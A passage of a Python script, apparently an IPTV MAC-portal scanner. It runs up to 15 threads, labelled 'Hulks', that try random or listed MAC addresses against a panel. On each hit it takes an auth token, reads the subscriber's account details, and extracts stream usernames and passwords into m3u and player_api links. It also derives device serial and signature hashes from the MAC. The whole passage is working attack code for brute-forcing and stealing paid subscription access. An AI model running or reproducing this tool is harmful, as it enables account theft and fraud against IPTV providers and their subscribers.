				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum=" 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real=''+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	
			     	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
			     	SNENC=SN.upper()
			     	SNCUT=SNENC[:13]
			     	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
			     	DEVENC=DEV.upper()
			     	SG=SNCUT+'+'+(mac)
			     	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
			     	SINGENC=SING.upper()
			     			
			     		
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn=" 𝐀𝐛𝐨𝐧𝐞 𝐈𝐏 𝐀𝐝𝐫𝐞𝐬𝐢 𝐲𝐨𝐤"
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' «💢» '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' «🎬» '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' «🖤️️» '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC)

def d12():
	global hitc
	global hitr
	global tokenr
	for mac in range(12,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Hulks12"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		veri=""
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum=" 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real=''+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	
			     	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
			     	SNENC=SN.upper()
			     	SNCUT=SNENC[:13]
			     	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
			     	DEVENC=DEV.upper()
			     	SG=SNCUT+'+'+(mac)
			     	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
			     	SINGENC=SING.upper()
			     			
			     		
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn=" 𝐀𝐛𝐨𝐧𝐞 𝐈𝐏 𝐀𝐝𝐫𝐞𝐬𝐢 𝐲𝐨𝐤"
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' «💢» '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' «🎬» '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' «🖤️️» '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC)

def d13():
	global hitc
	global hitr
	global tokenr
	for mac in range(13,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Hulks13"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		veri=""
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum=" 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real=''+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	
			     	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
			     	SNENC=SN.upper()
			     	SNCUT=SNENC[:13]
			     	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
			     	DEVENC=DEV.upper()
			     	SG=SNCUT+'+'+(mac)
			     	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
			     	SINGENC=SING.upper()
			     			
			     		
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn=" 𝐀𝐛𝐨𝐧𝐞 𝐈𝐏 𝐀𝐝𝐫𝐞𝐬𝐢 𝐲𝐨𝐤"
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' «💢» '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' «🎬» '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' «🖤️» '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC)

def d14():
	global hitc
	global hitr
	global tokenr
	for mac in range(14,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Hulks14"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		veri=""
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum=" 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real=''+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	
			     	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
			     	SNENC=SN.upper()
			     	SNCUT=SNENC[:13]
			     	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
			     	DEVENC=DEV.upper()
			     	SG=SNCUT+'+'+(mac)
			     	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
			     	SINGENC=SING.upper()
			     			
			     		
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn=" 𝐀𝐛𝐨𝐧𝐞 𝐈𝐏 𝐀𝐝𝐫𝐞𝐬𝐢 𝐲𝐨𝐤"
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' «💢» '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' «🎬» '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' «🖤️️» '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC)

def d15():
	global hitc
	global hitr
	global tokenr
	for mac in range(15,uz,botsay):
		total=mac
		if dsyno=="0":
			mac=randommac()
		else:
			macv=re.search(pattern,totLen[mac],re.IGNORECASE)
			if macv:
				mac=macv.group()
			else:
				continue
		macs=mac.upper().replace(':','%3A')
		bot="Hulks15"
		oran=""
		oran=round(((total)/(uz)*100),2)
		echok(mac,bot,total,hitc,oran,tokenr)
		bag=0
		veri=""
		while True:
			try:
				res = ses.get(url1, headers=hea1(macs), timeout=15, verify=False)
				veri=str(res.text)
				break
			except:
				bag=bag+1
				time.sleep(1)
				if bag==12:
					break
		tokenr="\33[35m"
		if 'token' in veri:
			tokenr="\33[0m"
			token=veri.replace('{"js":{"token":"',"")
			token=token.split('"')[0]
			bag=0
			while True:
			   try:
			     res = ses.get(url2, headers=hea2(macs,token), timeout=15, verify=False)
			     veri=""
			     veri=str(res.text)
			     break
			   except:
			   	bag=bag+1
			   	time.sleep(1)
			   	if bag==12:
			   		break
			id="null"
			ip=""
			try:
			     id=veri.split('{"js":{"id":')[1]
			     id=id.split(',"name')[0]
			     ip=veri.split('ip":"')[1]
			     ip=ip.split('"')[0]
			except:pass
			if not id=="null":
			    bag=0
			    while True:
			     	try:
				     	res = ses.get(url3, headers=hea2(macs,token), timeout=15, verify=False)
				     	veri=""
				     	veri=str(res.text)
				     	break
			     	except:
				     	bag=bag+1
				     	time.sleep(1)
				     	if bag==12:
				     		break
			    if not veri.count('phone')==0:
			     	hitr="\33[1;36m"
			     	hitc=hitc+1
			     	trh=""
			     	if 'end_date' in veri:
			     		trh=veri.split('end_date":"')[1]
			     		trh=trh.split('"')[0]
			     	else:
			     		  try:
			     		      trh=veri.split('phone":"')[1]
			     		      trh=trh.split('"')[0]
			     		      if trh.lower()[:2] =='un':
			     		      	KalanGun=(" Days")
			     		      else:
			     		      	KalanGun=(str(tarih_clear(trh))+" Days")
			     		      	trh=trh+' '+ KalanGun
			     		  except:pass
			     	hitprint(mac,trh)
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url6, headers=hea2(macs,token), timeout=10, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		cid=""
				     		cid=(str(res.text).split('ch_id":"')[5].split('"')[0])
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==10:
				     			#quit()
				     			cid="94067"
				     			break
			     	real=panel
			     	m3ulink=""
			     	user=""
			     	pas=""
			     	durum=" 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"
			     	bag=0
			     	while True:
			     		try:
				     		res = ses.get(url(cid), headers=hea2(macs,token), timeout=15, verify=False)
				     		veri=""
				     		veri=str(res.text)
				     		link=veri.split('ffmpeg ')[1].split('"')[0].replace('\/','/')
				     		real=''+link.split('://')[1].split('/')[0]+'/c/'
				     		user=str(link.replace('live/','').split('/')[3])
				     		pas=str(link.replace('live/','').split('/')[4])
				     		m3ulink="http://"+ real.replace('http://','').replace('/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
				     		durum=goruntu(link)
				     		break
				     	except:
				     		bag=bag+1
				     		time.sleep(1)
				     		if bag==12:
				     			break
			     	playerapi=""
			     	if not m3ulink=="":
			     		playerlink=str("http://"+real.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     		
			     		playerapi=m3uapi(playerlink,macs,token)
			     		if playerapi=="":
			     			playerlink=str("http://"+panel.replace('http://','').replace('/c/','') +"/player_api.php?username="+user+"&password="+pas)
			     			playerapi=m3uapi(playerlink,macs,token)
			     	
			     	SN=(hashlib.md5(mac.encode('utf-8')).hexdigest())
			     	SNENC=SN.upper()
			     	SNCUT=SNENC[:13]
			     	DEV=hashlib.sha256(mac.encode('utf-8')).hexdigest()
			     	DEVENC=DEV.upper()
			     	SG=SNCUT+'+'+(mac)
			     	SING=(hashlib.sha256(SG.encode('utf-8')).hexdigest())
			     	SINGENC=SING.upper()
			     			
			     		
			     	vpn=""
			     	if not ip =="":
			     		vpn=vpnip(ip)
			     	else:
			     	 	vpn=" 𝐀𝐛𝐨𝐧𝐞 𝐈𝐏 𝐀𝐝𝐫𝐞𝐬𝐢 𝐲𝐨𝐤"
			     	livelist=""
			     	vodlist=""
			     	serieslist=""
			     	if kanalkata=="1" or kanalkata=="2":
			     		listlink=liveurl
			     		livel=' «💢» '
			     		livelist=list(listlink,macs,token,livel)
			     	if kanalkata=="2":
			     		listlink=vodurl
			     		livel=' «🎬» '
			     		vodlist=list(listlink,macs,token,livel)
			     		listlink=seriesurl
			     		livel=' «🖤️️» '
			     		serieslist=list(listlink,macs,token,livel)
			     	hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC)

t1 = threading.Thread(target=d1)	
t2 = threading.Thread(target=d2)
t3= threading.Thread(target=d3)
t4= threading.Thread(target=d4)
t5= threading.Thread(target=d5)
t6= threading.Thread(target=d6)
t7= threading.Thread(target=d7)
t8= threading.Thread(target=d8)
t9= threading.Thread(target=d9)
t10= threading.Thread(target=d10)
t11= threading.Thread(target=d11)
t12= threading.Thread(target=d12)
t13= threading.Thread(target=d13)
t14= threading.Thread(target=d14)
t15= threading.Thread(target=d15)




t1.start()

if botsay==2 or botsay==3 or botsay==4 or botsay==5 or botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
	t2.start()
	
	
if botsay==3 or botsay==4 or botsay==5 or botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
	t3.start()
	
	
if botsay==4 or botsay==5 or botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
	t4.start()
	
	
if botsay==5 or botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
	t5.start()
	
	
if botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
	t6.start()
	
	
if botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
	t7.start()
	
	
if botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
	t8.start()
	
	
if botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
	t9.start()
	
	
if botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
	t10.start()
	
	
if  botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
	t11.start()
	

if botsay==12 or botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
	t12.start()
	
	
if botsay==13 or botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
	t13.start()
	

if botsay==14 or botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
	t14.start()
	

if botsay==15 or botsay==16 or botsay==17 or botsay==18 or botsay==19 or botsay==20 or botsay==21 or botsay==22 or botsay==23 or botsay==24 or botsay==25:
	t15.start()
	


	


	

